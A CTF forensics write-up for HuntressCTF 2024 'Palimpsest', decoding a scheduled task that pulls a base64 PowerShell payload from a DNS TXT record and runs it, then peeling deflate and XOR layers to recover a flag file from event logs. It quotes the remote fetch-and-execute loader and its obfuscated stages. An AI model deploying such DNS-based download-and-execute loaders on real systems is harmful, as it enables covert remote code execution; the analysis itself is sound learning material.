---
title: HuntressCTF 2024 Palimpsest
draft: false
tags:
  - ctf
  - forensics
  - evtx
---

# Palimpsest

> Our IT department was setting up a new workstation and started encountering some strange errors while installing software.  The technician noticed a strange scheduled task and luckily backed it up and grabbed some log files before wiping the machine!  Can you figure out what's going on?

We're provided four files:
1. `Application.evtx`
2. `Security.evtx`
3. `System.evtx`
4. `Updater Service.xml`

Based on the challenge prompt, the first thing to investigate is the scheduled service. Doing `cat Updater\ Service.xml` there's one section that really stands out:

```xml
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -Command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName 5aa456e4dbed10b.pyrchdata.com -Type txt | Select-Object -ExpandProperty Strings))))"</Arguments>
    </Exec>
  </Actions>
```

It grabs `TXT` records for the domain 5aa456e4dbed10b.pyrchdata.com, decodes from base64, and executes it as a PowerShell command. So, let's query the TXT record.

```bash
nslookup -q=txt 5aa456e4dbed10b.pyrchdata.com

5aa456e4dbed10b.pyrchdata.com	text = "LiggJFNIRWxsaURbMV0rJFNIRWxMaWRbMTNdKydYJykoIG5lVy1vQkpFQ1QgSW8uQ29tUHJlU3NJT04uZEVmbEFUZVN0UmVBbShbc3lTVGVtLklPLm1FTU9SWXNUUkVBTV1bc1lzdEVNLmNPbnZlUlRdOjpGUk9tQkFzRTY0c3RyaW5HKCAnWlZiTGF0eFFEUDBWTFZwbUp0d0o5MjE3bVQ1b0N5V0IwbDBJSmFWWkpKQVdzaWlCdHY5ZTZVaTY" "5clFMRzE5TDF1UG9TUEw1ZnYvdTd2UHg1KzNUL2NYWGoyOXBkL2I0N2Vsc2R6aS92SDI4dXk0aHBaQnZqZzlYOTk5M3U4TitmLzM2L2NYVDljME43U25sUkNIRmhRS2xPUE05eDlDbVFEWEtpOGl5M01MU1dTQlhUWHlGVkZpdFVoQ1ZOTEhHUktITVFiOHZtUzgrSkxaYnNnaGdIOC9RVEltZjJnTERLYk4yNjJ3bmk1Z042eHU1NER1TGkwSk" "RvY21uSkJwOG1xQ1FVb2U4U2NEWnpDYUpoRDMzaUpCY1lla2lSNjVOczViUVNHNTZTaERLUGNVSmVqV1lWTlhFQjdrVEpOZkx4Z1hCaDBValJ3M0Z2cHhENW5nVVh2RUFqSkZkbEJyQllaNFVQd2RUWEJDQ3cwR0JGWUdDQ1VlQ0tCbWtCTkFxeTVyR2xJRXJuWmpYYW51eFBFQXIwWDlHK2FFMnJWTkxva3NHL0ZxWVdkWElpZ0dIZUZFbDJ0W" "XBXQUc3Z3d3a1VxaHNRMHBOclVKUllSQmFaVWhBQnRiamNOaWtPT3d4aU5GV3lHdXBJdFI2STdFQ0JXRXFERGpZYklBNnFvSlRrdXp3RU1SY25pMW9NVmVNVDRKRlFaU0ZsSjZWOFpKQ21sL0xzeWgyakJyTHhVK2JrUy9MQmVVcXBHdU9ndHlVc095MUcweXdJeGxKMkxYb1M0RmRCSXdLQVpKNTFFamU4YXVHSWk0R3p4d1U4YVpJZ2lsS3Fp" "VU1Tam1QUktDOXIrMHFvcWlaVDI1RHFXQmRKTFZubEtwenpkcVdBQXBqMC9Nb0JRME9haHNyTjFzWTdhNHNhY29GV2psQ3ErTlVsUWNWTUhNbVBUdWpORCtsTlhraWk3VU5VbHh6WXJwTHNxb3B3RWsrR2c5SzB5VjhwV1FQUmdDcG92UGFjbVNHMW1tMGxWdFlhTXQvQWFrNFBaZDVUSVl5TzJOdFBuRVh6RFlZbmNoSUxnWXJPRWdvR0NJc2I" "zZi9PbXRHcVdtRmM5VCtCTGVyY3dtblBDdUpxRVRGanNtdXRiRjRyTktrRVBGVEtSNFUraklxOURVWkdSSUdId3NhSUtHZWJUc2dRbytrVFpDV3lkNlg0Z3lLN21aMmNGWk1TbFFxcW1BWmJGQVZrRGViUXZMb3BSZlhUQmNGVHZPS2p1L3FRU0pmRFZpTGpCVzI5c1JDb3c5QW1NM095alpyMXNsV2ZOb0NxOEY2blljTms1OUJvVEh4Wk9BMW" "xXS1FKeHZGUlpzdjZTekI4a25sTkFNWlJyb0RFRDhXd1VTMlNSZWRaU1FqWmNGTUl0dTdZMCtDY2pIL0M2d0Rvd0dmN0hiYUxuZmJtcHQyMGhucE84aHpHc3ZNb1NUL2V2WU5OaUk0eGJjdVRycStkdGJZTnJJbHZOdld3UUpRdGwyNGdzNTJpazFPQTkyMlRLZkQ3NWYwaS9CREpMOURMNzdROGRYejFhZGRmRzV2ZG9jL2REZysvUGh3eVg5T" "mZ3RT0nICkgLFtJby5jb01QUkVzc0lvbi5DT01QcmVTU2lPTk1vREVdOjpkRWNvbXBSRVNzKXwgZm9yRWFjSC1vYkpFQ1Qge25lVy1vQkpFQ1Qgc3lzVEVtLklPLlNUUkVBTVJFYURlUiggJF8gLCBbVEV4VC5lbmNvRGlOR106OmFzQ2lpICkgfXwgZm9yZUFDSC1PQmpFQ1QgeyRfLlJFQWRUb0VuZCgpIH0gKQ=="
```

Then, we can decode from base64:

```bash
echo "LiggJFNIRWxsaURbMV0rJFNIRWxMaWRbMTNdKydYJykoIG5lVy1vQkpFQ1QgSW8uQ29tUHJlU3NJT04uZEVmbEFUZVN0UmVBbShbc3lTVGVtLklPLm1FTU9SWXNUUkVBTV1bc1lzdEVNLmNPbnZlUlRdOjpGUk9tQkFzRTY0c3RyaW5HKCAnWlZiTGF0eFFEUDBWTFZwbUp0d0o5MjE3bVQ1b0N5V0IwbDBJSmFWWkpKQVdzaWlCdHY5ZTZVaTY" "5clFMRzE5TDF1UG9TUEw1ZnYvdTd2UHg1KzNUL2NYWGoyOXBkL2I0N2Vsc2R6aS92SDI4dXk0aHBaQnZqZzlYOTk5M3U4TitmLzM2L2NYVDljME43U25sUkNIRmhRS2xPUE05eDlDbVFEWEtpOGl5M01MU1dTQlhUWHlGVkZpdFVoQ1ZOTEhHUktITVFiOHZtUzgrSkxaYnNnaGdIOC9RVEltZjJnTERLYk4yNjJ3bmk1Z042eHU1NER1TGkwSk" "RvY21uSkJwOG1xQ1FVb2U4U2NEWnpDYUpoRDMzaUpCY1lla2lSNjVOczViUVNHNTZTaERLUGNVSmVqV1lWTlhFQjdrVEpOZkx4Z1hCaDBValJ3M0Z2cHhENW5nVVh2RUFqSkZkbEJyQllaNFVQd2RUWEJDQ3cwR0JGWUdDQ1VlQ0tCbWtCTkFxeTVyR2xJRXJuWmpYYW51eFBFQXIwWDlHK2FFMnJWTkxva3NHL0ZxWVdkWElpZ0dIZUZFbDJ0W" "XBXQUc3Z3d3a1VxaHNRMHBOclVKUllSQmFaVWhBQnRiamNOaWtPT3d4aU5GV3lHdXBJdFI2STdFQ0JXRXFERGpZYklBNnFvSlRrdXp3RU1SY25pMW9NVmVNVDRKRlFaU0ZsSjZWOFpKQ21sL0xzeWgyakJyTHhVK2JrUy9MQmVVcXBHdU9ndHlVc095MUcweXdJeGxKMkxYb1M0RmRCSXdLQVpKNTFFamU4YXVHSWk0R3p4d1U4YVpJZ2lsS3Fp" "VU1Tam1QUktDOXIrMHFvcWlaVDI1RHFXQmRKTFZubEtwenpkcVdBQXBqMC9Nb0JRME9haHNyTjFzWTdhNHNhY29GV2psQ3ErTlVsUWNWTUhNbVBUdWpORCtsTlhraWk3VU5VbHh6WXJwTHNxb3B3RWsrR2c5SzB5VjhwV1FQUmdDcG92UGFjbVNHMW1tMGxWdFlhTXQvQWFrNFBaZDVUSVl5TzJOdFBuRVh6RFlZbmNoSUxnWXJPRWdvR0NJc2I" "zZi9PbXRHcVdtRmM5VCtCTGVyY3dtblBDdUpxRVRGanNtdXRiRjRyTktrRVBGVEtSNFUraklxOURVWkdSSUdId3NhSUtHZWJUc2dRbytrVFpDV3lkNlg0Z3lLN21aMmNGWk1TbFFxcW1BWmJGQVZrRGViUXZMb3BSZlhUQmNGVHZPS2p1L3FRU0pmRFZpTGpCVzI5c1JDb3c5QW1NM095alpyMXNsV2ZOb0NxOEY2blljTms1OUJvVEh4Wk9BMW" "xXS1FKeHZGUlpzdjZTekI4a25sTkFNWlJyb0RFRDhXd1VTMlNSZWRaU1FqWmNGTUl0dTdZMCtDY2pIL0M2d0Rvd0dmN0hiYUxuZmJtcHQyMGhucE84aHpHc3ZNb1NUL2V2WU5OaUk0eGJjdVRycStkdGJZTnJJbHZOdld3UUpRdGwyNGdzNTJpazFPQTkyMlRLZkQ3NWYwaS9CREpMOURMNzdROGRYejFhZGRmRzV2ZG9jL2REZysvUGh3eVg5T" "mZ3RT0nICkgLFtJby5jb01QUkVzc0lvbi5DT01QcmVTU2lPTk1vREVdOjpkRWNvbXBSRVNzKXwgZm9yRWFjSC1vYkpFQ1Qge25lVy1vQkpFQ1Qgc3lzVEVtLklPLlNUUkVBTVJFYURlUiggJF8gLCBbVEV4VC5lbmNvRGlOR106OmFzQ2lpICkgfXwgZm9yZUFDSC1PQmpFQ1QgeyRfLlJFQWRUb0VuZCgpIH0gKQ==" | base64 -d
```

```ps1
.( $SHElliD[1]+$SHElLid[13]+'X')( neW-oBJECT Io.ComPreSsION.dEflATeStReAm([sySTem.IO.mEMORYsTREAM][sYstEM.cOnveRT]::FROmBAsE64strinG( 'ZVbLatxQDP0VLVpmJtwJ9217mT5oCyWB0l0IJaVZJJAWsiiBtv9e6Ui69rQLG19L1uPoSPL5fv/u7vPx5+3T/cXXj29pd/b47elsdzi/vH28uy4hpZBvjg9X9993u8N+f/36/cXT9c0N7SnlRCHFhQKlOPM9x9CmQDXKi8iy3MLSWSBXTXyFVFitUhCVNLHGRKHMQb8vmS8+JLZbsghgH8/QTImf2gLDKbN262wni5gN6xu54DuLi0JDocmnJBp8mqCQUoe8ScDZzCaJhD33iJBcYekiR65Ns5bQSG56ShDKPcUJejWYVNXEB7kTJNfLxgXBh0UjRw3FvpxD5ngUXvEAjJFdlBrBYZ4UPwdTXBCCw0GBFYGCCUeCKBmkBNAqy5rGlIErnZjXanuxPEAr0X9G+aE2rVNLoksG/FqYWdXIigGHeFEl2tYpWAG7gwwkUqhsQ0pNrUJRYRBaZUhABtbjcNikOOwxiNFWyGupItR6I7ECBWEqDDjYbIA6qoJTkuzwEMRcni1oMVeMT4JFQZSFlJ6V8ZJCml/Lsyh2jBrLxU+bkS/LBeUqpGuOgtyUsOy1G0ywIxlJ2LXoS4FdBIwKAZJ51Eje8auGIi4GzxwU8aZIgilKqiUMSjmPRKC9r+0qoqiZT25DqWBdJLVnlKpzzdqWAApj0/MoBQ0OahsrN1sY7a4sacoFWjlCq+NUlQcVMHMmPTujND+lNXkii7UNUlxzYrpLsqopwEk+Gg9K0yV8pWQPRgCpovPacmSG1mm0lVtYaMt/Aak4PZd5TIYyO2NtPnEXzDYYnchILgYrOEgoGCIsb3f/OmtGqWmFc9T+BLercwmnPCuJqETFjsmutbF4rNKkEPFTKR4U+jIq9DUZGRIGHwsaIKGebTsgQo+kTZCWyd6X4gyK7mZ2cFZMSlQqqmAZbFAVkDebQvLopRfXTBcFTvOKju/qQSJfDViLjBW29sRCow9AmM3OyjZr1slWfNoCq8F6nYcNk59BoTHxZOA1lWKQJxvFRZsv6SzB8knlNAMZRroDED8WwUS2SRedZSQjZcFMItu7Y0+CcjH/C6wDowGf7HbaLnfbmpt20hnpO8hzGsvMoST/evYNNiI4xbcuTrq+dtbYNrIlvNvWwQJQtl24gs52ik1OA922TKfD75f0i/BDJL9DL77Q8dXz1addfG5vdoc/dDg+/PhwyX9NfwE=' ) ,[Io.coMPREssIon.COMPreSSiONMoDE]::dEcompRESs)| forEacH-obJECT {neW-oBJECT sysTEm.IO.STREAMREaDeR( $_ , [TExT.encoDiNG]::asCii ) }| foreACH-OBjECT {$_.REAdToEnd() } )
```

We have some slightly obfuscated PowerShell. It's pretty apparent what it's doing, based on the `neW-oBJECT Io.ComPreSsION.dEflATeStReAm([sySTem.IO.mEMORYsTREAM][sYstEM.cOnveRT]::FROmBAsE64string`. Luckily, I have a handy Python script called [deflate.py](https://github.com/landoncrabtree/ctf-toolbox/blob/main/reverse-engineering/deflate.py) that allows me to deflate PowerShell memorystreams without using PowerShell. Updating the base64 string in the script and running the script:

```bash
python3 deflate.py
```

```ps1
.((GeT-variAbLE '*mdr*').Name[3,11,2]-jOin'')(([CHAr[]] ( 121 ,109 , 108 , 20,57, 40, 100 ,125,96 , 6 , 41, 4,13, 24 ,0, 117,127 ,38,108 , 32, 38,111 ,32 ,38 ,109,32 ,127 ,112 ,59,125,122, 56, 122 ,113,122, 52, 50 ,122, 113 , 122 ,115 ,59 , 52 ,17,122,116 , 125, 102,125,121 , 38 ,60 , 32 , 125, 96,125 , 105,109 ,109, 109,109 ,115 , 115 ,107 , 104,109,109, 109, 102 ,125,121,38 ,63 , 32 , 125 , 96, 125, 125 ,121 , 109, 108,20 ,57, 40 ,100, 103 , 103,117 , 127, 38,108 , 32,38 , 109 ,32,38,111 , 32,127 ,125, 112 , 59,125, 122, 47 ,52 , 122,113, 117 , 127, 38 , 108, 32, 38 , 109, 32 ,127,125, 112 , 59,122 ,45, 56, 51, 10 ,122,113 , 122 ,18,122 , 116 , 113, 122 , 41 , 56 ,122 ,116 ,115 , 20 ,51,43 ,50 , 54 , 56,117 ,117,23 ,50, 52,51,112, 13 , 60,41 ,53 ,125 , 112, 13,60 ,41 ,53 ,125,121,38,24 ,51,11, 103 , 60, 61 , 13 , 61 ,45 , 61,25 ,28, 41 , 60 ,32,125,112 ,30 , 53 , 52, 49, 57, 13,60 , 41 , 53,125, 59,49,60, 58 ,115, 48 , 45,105,116 ,116 ,102,125 ,26 , 56 ,41 , 112,24 ,43, 56 , 51,41 ,17, 50, 58,125, 112,17,50,58 , 19 , 60,48,56 ,125 ,117,127 , 38,109,32,38 , 111 , 32, 38, 108 ,32 ,38, 110,32,127,125 ,112 , 59 , 125,122,28,45, 122, 113,122 , 49,52,62,60 ,41 , 52 , 122, 113 ,122, 45,122 ,113, 122 ,50 ,51, 122 ,116 , 125 ,112 ,14 ,50, 40 , 47 ,62, 56 ,125 ,117 , 127 , 38, 109, 32,38, 111,32 ,38, 108,32, 127 , 112,59 ,122, 48 , 46, 49 ,51,46,41 , 60,49,122 , 113,122 ,56,47, 122,113 ,122, 49 ,122 , 116 ,125,33 ,125 ,98 , 125 , 38,125 , 121 , 38, 28,32 ,125 , 112,62, 50,51,41 , 60 ,52 ,51,46 ,125, 121 , 38,2,32, 115,127 ,20, 51, 61 , 46 ,41 , 61 , 28 , 51, 30, 56 ,61, 52 , 25 , 127,125 , 32, 125 ,33,125 , 14 , 50, 47 ,41,112 , 18 ,63, 55 ,56, 62 , 41, 125, 20, 51, 57 ,56,37, 125, 33, 125,120, 125 ,38, 125 , 121 , 38, 30 ,32 , 125 ,96 , 125 , 121 ,38 , 2,32 , 115 , 127, 57,61 , 28 , 9, 60 , 127,102 ,125 ,121 , 38, 63, 32 , 115 ,117,127,38,108 ,32, 38, 109 ,32,127,112,59,125,122, 52 ,41 ,56 ,122 ,113 , 122,10, 47, 122, 116 , 115,20 , 51 ,43 ,50 ,54 ,56 , 117 ,121, 38 , 30,32,113,125,109,113,125 ,121 , 38 ,30, 32,115 ,127 ,17 , 56, 19 , 61, 26 ,9, 53, 127 ,116 , 125, 32 ,102 , 125 , 121 ,38, 63, 32, 115, 117,127 ,38, 108 , 32, 38 ,109, 32, 127 , 125,112, 59,125 , 117 , 127, 38, 109 ,32 , 38 ,108, 32,127, 125 , 112,59,125,122,49 , 50, 46 ,122 , 113 , 122 ,56,122 , 116, 113 ,122 ,30,122 , 116 ,115,20 , 51, 43, 50, 54 ,56 ,117 ,116 )|% { [CHAr] ( $_ -BxOR'0x5D')} )-joIN'')
```

Another layer of obfuscation. This time we have an array of numbers. At the very end, we also see a `-BxOR'ox5D'` statement, so looks like it's iterating through each element of the array and XORing with 0x5d. We can reverse this with a simple Python script as well 😄

```python
ascii = [121 ,109 , 108 , 20,57, 40, 100 ,125,96 , 6 , 41, 4,13, 24 ,0, 117,127 ,38,108 , 32, 38,111 ,32 ,38 ,109,32 ,127 ,112 ,59,125,122, 56, 122 ,113,122, 52, 50 ,122, 113 , 122 ,115 ,59 , 52 ,17,122,116 , 125, 102,125,121 , 38 ,60 , 32 , 125, 96,125 , 105,109 ,109, 109,109 ,115 , 115 ,107 , 104,109,109, 109, 102 ,125,121,38 ,63 , 32 , 125 , 96, 125, 125 ,121 , 109, 108,20 ,57, 40 ,100, 103 , 103,117 , 127, 38,108 , 32,38 , 109 ,32,38,111 , 32,127 ,125, 112 , 59,125, 122, 47 ,52 , 122,113, 117 , 127, 38 , 108, 32, 38 , 109, 32 ,127,125, 112 , 59,122 ,45, 56, 51, 10 ,122,113 , 122 ,18,122 , 116 , 113, 122 , 41 , 56 ,122 ,116 ,115 , 20 ,51,43 ,50 , 54 , 56,117 ,117,23 ,50, 52,51,112, 13 , 60,41 ,53 ,125 , 112, 13,60 ,41 ,53 ,125,121,38,24 ,51,11, 103 , 60, 61 , 13 , 61 ,45 , 61,25 ,28, 41 , 60 ,32,125,112 ,30 , 53 , 52, 49, 57, 13,60 , 41 , 53,125, 59,49,60, 58 ,115, 48 , 45,105,116 ,116 ,102,125 ,26 , 56 ,41 , 112,24 ,43, 56 , 51,41 ,17, 50, 58,125, 112,17,50,58 , 19 , 60,48,56 ,125 ,117,127 , 38,109,32,38 , 111 , 32, 38, 108 ,32 ,38, 110,32,127,125 ,112 , 59 , 125,122,28,45, 122, 113,122 , 49,52,62,60 ,41 , 52 , 122, 113 ,122, 45,122 ,113, 122 ,50 ,51, 122 ,116 , 125 ,112 ,14 ,50, 40 , 47 ,62, 56 ,125 ,117 , 127 , 38, 109, 32,38, 111,32 ,38, 108,32, 127 , 112,59 ,122, 48 , 46, 49 ,51,46,41 , 60,49,122 , 113,122 ,56,47, 122,113 ,122, 49 ,122 , 116 ,125,33 ,125 ,98 , 125 , 38,125 , 121 , 38, 28,32 ,125 , 112,62, 50,51,41 , 60 ,52 ,51,46 ,125, 121 , 38,2,32, 115,127 ,20, 51, 61 , 46 ,41 , 61 , 28 , 51, 30, 56 ,61, 52 , 25 , 127,125 , 32, 125 ,33,125 , 14 , 50, 47 ,41,112 , 18 ,63, 55 ,56, 62 , 41, 125, 20, 51, 57 ,56,37, 125, 33, 125,120, 125 ,38, 125 , 121 , 38, 30 ,32 , 125 ,96 , 125 , 121 ,38 , 2,32 , 115 , 127, 57,61 , 28 , 9, 60 , 127,102 ,125 ,121 , 38, 63, 32 , 115 ,117,127,38,108 ,32, 38, 109 ,32,127,112,59,125,122, 52 ,41 ,56 ,122 ,113 , 122,10, 47, 122, 116 , 115,20 , 51 ,43 ,50 ,54 ,56 , 117 ,121, 38 , 30,32,113,125,109,113,125 ,121 , 38 ,30, 32,115 ,127 ,17 , 56, 19 , 61, 26 ,9, 53, 127 ,116 , 125, 32 ,102 , 125 , 121 ,38, 63, 32, 115, 117,127 ,38, 108 , 32, 38 ,109, 32, 127 , 125,112, 59,125 , 117 , 127, 38, 109 ,32 , 38 ,108, 32,127, 125 , 112,59,125,122,49 , 50, 46 ,122 , 113 , 122 ,56,122 , 116, 113 ,122 ,30,122 , 116 ,115,20 , 51, 43, 50, 54 ,56 ,117 ,116]

for i in ascii:
    # xor 0x5D
    print(chr(i ^ 0x5D), end="")
```

```ps1
$01Idu9 =[tYPE]("{1}{2}{0}"-f 'e','io','.fiL') ; ${a} = 40000..65000; ${b} =  $01Idu9::("{1}{0}{2}" -f 'ri',("{1}{0}" -f'penW','O'),'te').Invoke((Join-Path -Path ${EnV:a`P`p`DAta} -ChildPath flag.mp4)); Get-EventLog -LogName ("{0}{2}{1}{3}" -f 'Ap','licati','p','on') -Source ("{0}{2}{1}"-f'mslnstal','er','l') | ? { ${A} -contains ${_}."In`st`AnCe`iD" } | Sort-Object Index | % { ${C} = ${_}."d`ATa"; ${b}.("{1}{0}"-f 'ite','Wr').Invoke(${C}, 0, ${C}."LeN`GTh") }; ${b}.("{1}{0}" -f ("{0}{1}" -f 'los','e'),'C').Invoke()
```

This is the last layer! It's more heavily obfuscated than the others, but it's still pretty trivial. 
* Create an array of numbers 40000-65000
* Open file `%AppData%/flag.mp4`
* Call `Get-EventLog` on `Application` logs
	* Filter by `Source` = `mslnstaller`
	* Filter by `InstanceId` in range of 40000-65000
* Sort based on `Index`
* Write the `Data` to `flag.mp4`
* Close the handle on `%AppData%/flag.mp4`

You can easily reverse this if you're on Windows by using PowerShell, which is what my team did initially:

```ps1
$fileHandler = [io.file]::OpenWrite((Join-Path -Path ${Env:APPDATA} -ChildPath "flag.mp4"))
$instanceIDs = 40000..65000

# Load events from the specified .evtx file
$eventLogPath = ".\Application.evtx"
Get-WinEvent -Path $eventLogPath |
    Where-Object { $_.ProviderName -eq "Mslnstaller" -and $instanceIDs -contains $_.Id } | 
    Sort-Object RecordId |
    ForEach-Object { 
        $data = $_.Properties[1].Value 
        $fileHandler.Write($data, 0, $data.Length)
    }

$fileHandler.Close()
```

Or, if you're working on a non-Windows OS, you can utilize things like Python `evtx` library or `chainsaw`. I opted for the latter: first converting the `Application.evtx` into JSON:

```bash
chainsaw dump Application.evtx --json -o Application.json
```

Then, I created a Python script to replicate the filtering logic of the PowerShell script:

```python
import json
import base64

with open("Application.json") as f:
    data = json.load(f)

chunks = [None] * 65000
eventIds = [i for i in range(40000, 65000)]


for event in data:
    name = event['Event']['System']['Provider_attributes']['Name']
    eventId = event['Event']['System']['EventID']
    recordId = event['Event']['System']['EventRecordID']
    
    # Filter based on the PowerShell deobfuscated
    if name != 'Mslnstaller': continue
    if eventId not in eventIds: continue
    
    # Get the data
    binary = event['Event']['EventData']['Binary']
    if binary == None: continue
    chunks[recordId] = binary

# Get rid of None values
chunks = [x for x in chunks if x is not None]
with open('flag.mp4', 'wb') as f:
    f.write(bytes.fromhex(''.join(chunks)))
```

Running this script will iterate through the events and if it's a valid event (source and EventID match), it will place the binary data in the chunk based on RecordID. Then, we just clear unused chunks and write the file to `flag.mp4`!

```bash
python3 solve.py
file flag.mp4
flag.mp4: ISO Media, MP4 Base Media v1 [ISO 14496-12:2003]
```